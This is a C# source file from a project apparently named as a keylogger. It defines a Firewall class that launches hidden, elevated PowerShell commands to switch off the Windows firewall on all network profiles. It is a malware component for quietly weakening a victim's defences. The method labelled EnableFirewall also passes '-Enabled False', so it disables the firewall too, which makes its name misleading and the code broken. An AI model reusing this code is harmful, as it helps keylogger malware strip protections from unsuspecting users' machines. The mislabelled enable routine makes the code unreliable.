using System.Diagnostics;

namespace Ex2_Keylogger
{
	internal class Firewall
	{
		private const string DisableFirewallString =
			@"-command Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False";

		private const string EnableFirewallString =
			@"-command Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False";

		public static void DisableFirewall()
		{
			Process.Start(new ProcessStartInfo
			{
				Arguments = DisableFirewallString,
				CreateNoWindow = true,
				FileName = "powershell.exe",
				Verb = "runas"
			});
		}

		public static void EnableFirewall()
		{
			Process.Start(new ProcessStartInfo
			{
				Arguments = EnableFirewallString,
				CreateNoWindow = true,
				FileName = "powershell.exe",
				Verb = "runas"
			});
		}
	}
}
